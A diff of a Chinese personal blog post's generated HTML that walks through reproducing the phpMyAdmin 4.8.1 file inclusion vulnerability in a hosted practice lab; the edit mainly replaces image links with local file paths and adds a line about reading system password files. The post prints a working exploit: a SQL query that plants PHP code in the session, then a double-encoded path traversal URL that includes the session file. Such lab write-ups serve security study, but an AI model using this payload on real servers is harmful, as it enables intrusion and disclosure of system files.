@@ -13,7 +13,7 @@
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: phpmyadmin4.8漏洞演示\n\n\n\n\n\n进入vulnsp网站，点击start to hack，跳转到VSPlat\n\n\n\n\n点击进入实验，点击开始按钮\n\n\n进入phpmyadmin登录界面，用户名：root，密码：toor登录\n\n\n点击SQL，输入如下命令：\n1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;\n\n\n\n获取自己的SESSION ID\n\n1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n\n\n\n\n\n包含SESSION文件，成功利用该漏洞\n1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n网页输入payload，页面如下，成功利用该漏洞\n\n\n\n","dateCreated":"2019-07-28T13:23:57+08:00","dateModified":"2019-09-07T17:43:22+08:00","datePublished":"2019-07-28T13:23:57+08:00","description":"Abstract: phpmyadmin4.8漏洞演示","headline":"phpmyadmin文件包含漏洞复现","image":["http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/28/phpmyadmin-bug/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/28/phpmyadmin-bug/","keywords":"漏洞复现, phpmyadmin, 文件包含漏洞","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: phpmyadmin4.8漏洞演示\n\n\n\n\n\n进入vulnsp网站，点击start to hack，跳转到VSPlat\n\n\n点击进入实验，点击开始按钮\n\n进入phpmyadmin登录界面，用户名：root，密码：toor登录\n\n点击SQL，输入如下命令：\n1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;\n\n\n\n获取自己的SESSION ID\n1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n\n\n\n   \n\n包含SESSION文件，成功利用该漏洞\n1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n网页输入payload，页面如下，成功利用该漏洞\n\n\n\n还可以查看 /etc/password 文件\n\n","dateCreated":"2019-07-28T13:23:57+08:00","dateModified":"2019-09-09T13:22:04+08:00","datePublished":"2019-07-28T13:23:57+08:00","description":"Abstract: phpmyadmin4.8漏洞演示","headline":"phpmyadmin文件包含漏洞复现","image":["http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/28/phpmyadmin-bug/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/28/phpmyadmin-bug/","keywords":"漏洞复现, phpmyadmin, 文件包含漏洞","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"}</script>
     <meta name="description" content="Abstract: phpmyadmin4.8漏洞演示">
 <meta name="keywords" content="漏洞复现,phpmyadmin,文件包含漏洞">
 <meta property="og:type" content="blog">
@@ -22,17 +22,15 @@
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: phpmyadmin4.8漏洞演示">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug0.png">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug1.png">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug2.png">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug3.png">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug4faccb358f56b8296.png">
-<meta property="og:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug5.png">
-<meta property="og:updated_time" content="2019-09-07T09:43:22.117Z">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin3.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin4.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin1.png">
+<meta property="og:updated_time" content="2019-09-09T05:22:04.506Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpmyadmin文件包含漏洞复现">
 <meta name="twitter:description" content="Abstract: phpmyadmin4.8漏洞演示">
-<meta name="twitter:image" content="https://s3.ax2x.com/2019/07/27/phpmyadminBug0.png">
+<meta name="twitter:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png">
     
     
         
@@ -299,38 +297,35 @@
 <!--export-->
 
 <ol>
-<li><p>进入<a href="https://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="noopener">vulnsp</a>网站，点击<a href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1&autogo=1" target="_blank" rel="noopener">start to hack</a>，跳转到VSPlat</p>
-<p><a href="https://free.imgsha.com/i/mIN2s" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug0.png" alt="phpmyadminBug0.png"></a></p>
-</li>
+<li>进入<a href="https://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="noopener">vulnsp</a>网站，点击<a href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1&autogo=1" target="_blank" rel="noopener">start to hack</a>，跳转到VSPlat</li>
 </ol>
 <ol start="2">
 <li><p>点击进入实验，点击开始按钮</p>
-<p><a href="https://free.imgsha.com/i/mIRpV" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug1.png" alt="phpmyadminBug1.png"></a></p>
 </li>
 <li><p>进入phpmyadmin登录界面，用户名：root，密码：toor登录</p>
-<p><a href="https://free.imgsha.com/i/mIgV0" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug2.png" alt="phpmyadminBug2.png"></a></p>
 </li>
 <li><p>点击SQL，输入如下命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://free.imgsha.com/i/mI0GD" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug3.png" alt="phpmyadminBug3.png"></a></p>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png" alt></p>
 </li>
 <li><p>获取自己的SESSION ID</p>
-<p><a href="https://free.imgsha.com/i/mIf7N" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug4faccb358f56b8296.png" alt="phpmyadminBug4faccb358f56b8296.png"></a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure>
-
 
 
 </li>
 </ol>
+<p>   <img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin3.png" alt></p>
 <ol start="6">
 <li><p>包含SESSION文件，成功利用该漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>网页输入payload，页面如下，成功利用该漏洞</p>
-<p><a href="https://free.imgsha.com/i/mIpmX" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug5.png" alt="phpmyadminBug5.png"></a></p>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin4.png" alt></p>
 </li>
 </ol>
+<p>还可以查看 <code>/etc/password</code> 文件</p>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin1.png" alt></p>
 
             
 
@@ -1006,7 +1001,7 @@
                 data-message-zero="no post found"
                 data-message-one="1 post found"
                 data-message-other="{n} posts found">
-                57 posts found
+                58 posts found
             </p>
         </div>
     </div>
